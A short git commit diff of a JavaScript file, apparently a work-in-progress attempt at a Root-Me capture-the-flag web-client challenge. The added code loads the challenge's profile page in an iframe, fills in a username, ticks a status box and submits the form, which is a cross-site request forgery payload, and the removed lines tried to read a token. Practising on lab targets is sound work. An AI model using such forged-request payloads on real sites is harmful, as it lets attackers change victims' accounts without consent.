d3c20ede2a16ca5b515234a27836d0103fa739e9
fullgitstack <mackormack0@gmail.com>
2025-10-10 17:58:48 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,11 @@
 const ifr = document.querySelector("#principalIframe")
-const token = ifr.contentDocument.querySelector("#token")
-console.log(token)
+ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
+
+ifr.querySelector("#username").value = "test1"
+ifr.querySelector("#status").checked = true
+
+ifr.forms[0].submit()
+
+
+
 
